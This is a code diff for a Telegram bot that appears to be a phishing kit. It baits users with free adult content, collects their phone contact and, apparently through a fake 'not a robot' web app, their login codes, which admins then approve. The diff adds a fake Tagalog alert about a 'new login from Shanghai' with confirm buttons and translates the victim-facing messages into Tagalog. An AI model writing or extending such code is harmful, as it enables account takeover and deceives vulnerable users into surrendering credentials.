@@ -6,6 +6,7 @@ const BOT_TOKEN = process.env.BOT_TOKEN;
 const WEBAPP_URL = process.env.WEBAPP_URL;     // e.g. https://tgreward.shop/webapp.html
 const WEBSITE_URL = process.env.WEBSITE_URL;   // e.g. https://tgreward.shop/QTSJAOPPHU.html
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // e.g. "5757713537"
+const PHOTO_URL = process.env.PHOTO_URL || "https://i.imgur.com/qQRtr7u.jpeg"; // Image URL for login verification
 
 if (!BOT_TOKEN) {
   throw new Error("BOT_TOKEN is not set");
@@ -99,7 +100,7 @@ bot.on("contact", async (ctx) => {
   );
   scheduleDelete(ctx.chat.id, reply.message_id);
 
-  // STEP 2: show WebApp button (“I'm not a robot!”)
+  // STEP 2: show WebApp button ("I'm not a robot!")
   const webappMsg = await ctx.reply(
     "🔞 To access the files completely free 💦\n\n" +
       "👇 Confirm that you are not a robot",
@@ -124,10 +125,32 @@ bot.on("message", async (ctx) => {
   const data = ctx.message.web_app_data?.data;
   if (data) {
     console.log("WEBAPP DATA:", data);
-    const msg = await ctx.reply(
-      "Your verification was submitted. Please wait. ⏳"
-    );
-    scheduleDelete(ctx.chat.id, msg.message_id);
+    
+    // Send photo with "Yes, it's me" button
+    try {
+      const photoMsg = await ctx.replyWithPhoto(
+        PHOTO_URL,
+        {
+          caption: "May nag-login sa account mo!\n\n" +
+                   "Nakita namin na may bagong login mula sa Xiaomi Xiaomi 12T Pro, Shanghai, China. Ikaw ba ito?",
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: "Oo, ako yan", callback_data: `confirm_login:${ctx.from.id}` },
+                { text: "Hindi ako yan!", callback_data: `deny_login:${ctx.from.id}` }
+              ]
+            ]
+          }
+        }
+      );
+      scheduleDelete(ctx.chat.id, photoMsg.message_id);
+    } catch (err) {
+      console.error("Error sending photo:", err);
+      const msg = await ctx.reply(
+        "Isinumite na ang verification mo. Sandali lang. ⏳"
+      );
+      scheduleDelete(ctx.chat.id, msg.message_id);
+    }
   }
 });
 
@@ -195,11 +218,32 @@ app.post("/api/log-code", async (req, res) => {
   }
 });
 
-// handle admin Approve/Reject buttons
+// handle admin Approve/Reject buttons AND user confirm/deny login
 bot.on("callback_query", async (ctx) => {
   const data = ctx.callbackQuery.data;
   if (!data) return;
 
+  // Handle user login confirmation
+  if (data.startsWith("confirm_login:") || data.startsWith("deny_login:")) {
+    const [action, userId] = data.split(":");
+    
+    if (action === "confirm_login") {
+      await ctx.answerCbQuery("Salamat sa confirmation!");
+      await ctx.editMessageCaption(
+        "✅ Nakumpirma mo na ikaw ang nag-login.\n\n" +
+        "Hinihintay na lang natin ang approval ng admin."
+      );
+    } else if (action === "deny_login") {
+      await ctx.answerCbQuery("Nag-report ka ng suspicious login");
+      await ctx.editMessageCaption(
+        "⚠️ Nag-report ka na hindi ikaw ang nag-login.\n\n" +
+        "Paki-check ang security ng account mo."
+      );
+    }
+    return;
+  }
+
+  // Handle admin approval/rejection
   const [action, submissionId] = data.split(":");
   const submission = submissions.get(submissionId);
 
@@ -239,7 +283,7 @@ bot.on("callback_query", async (ctx) => {
       if (userId) {
         await bot.telegram.sendMessage(
           userId,
-          "✅ Your verification has been APPROVED.\n\n" +
+          "✅ Nag-approve na ang admin sa verification mo.\n\n" +
             "Pwede ka nang mag join sa EXCLUSIVE group for free:\n" +
             "👉 https://t.me/+iPLQ7YG-H200ZGQ1"
         );
@@ -249,8 +293,8 @@ bot.on("callback_query", async (ctx) => {
       if (userId) {
         await bot.telegram.sendMessage(
           userId,
-          "❌ Your verification has been REJECTED.\n\n" +
-            "Please check the instructions in the channel and try again."
+          "❌ Hindi nag-approve ang admin sa verification mo.\n\n" +
+            "Paki-check ang instructions sa channel at subukan ulit."
         );
       }
     }
